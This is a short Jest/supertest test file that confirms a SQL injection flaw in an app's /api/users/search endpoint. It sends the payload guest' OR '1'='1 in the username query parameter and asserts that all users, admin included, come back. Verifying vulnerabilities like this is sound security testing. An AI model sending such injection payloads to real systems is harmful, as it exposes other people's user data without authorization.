const request = require('supertest');
const app = require('./app');

describe('SQL Injection in /api/users/search', () => {
  test('should verify SQL Injection vulnerability via response', async () => {
    // A regular query returns guest with role user
    const normalRes = await request(app).get("/api/users/search?username=guest");
    expect(normalRes.status).toBe(200);
    expect(normalRes.body).toBeInstanceOf(Array);
    
    // Inject SQL payload targeting sqlite: guest' OR '1'='1
    const sqlInjectionRes = await request(app).get("/api/users/search?username=guest'+OR+'1'='1");
    expect(sqlInjectionRes.status).toBe(200);
    expect(sqlInjectionRes.body).toBeInstanceOf(Array);
    
    // The query becomes: SELECT id, username, role FROM users WHERE username = 'guest' OR '1'='1'
    // Since '1'='1' is always true, it must return all users (admin & guest), including passwords (or roles in this case)
    const users = sqlInjectionRes.body;
    expect(users.length).toBeGreaterThan(1);
    
    // Ensure both guest and admin are returned in the response
    const usernames = users.map(u => u.username);
    expect(usernames).toContain('admin');
    expect(usernames).toContain('guest');
  });
});
